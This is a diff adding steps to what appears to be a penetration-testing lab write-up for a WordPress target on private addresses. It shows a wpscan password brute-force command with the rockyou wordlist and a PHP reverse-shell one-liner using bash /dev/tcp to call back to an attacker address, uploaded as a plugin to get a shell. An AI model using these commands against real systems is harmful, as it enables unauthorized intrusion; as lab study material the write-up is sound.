@@ -210,3 +210,21 @@ I notice that the name of the commenter is similar to the note file downloaded f
 ```
 wpscan --url https://192.168.172.148:12380/blogblog/ --passwords ~/Documents/rockyou.txt --max-threads 50 --usernames john --disable-tls-checks
 ```
+
+Logging in to WordPress admin interface. I find out that we have permission to upload plugin files.
+
+Creating a reverse shell php file.
+
+```
+echo '<?php exec("/bin/bash -c '\''bash -i >& /dev/tcp/192.168.49.172/80 0>&1'\''");?>' > shell.php
+```
+
+![image]
+
+Uploading shell.php file to server. 
+
+![image]
+
+Browsing to plugin url ```https://192.168.172.148:12380/blogblog/wp-content/uploads/shell.php``` and we get shell.
+
+#### Privilege Escalation
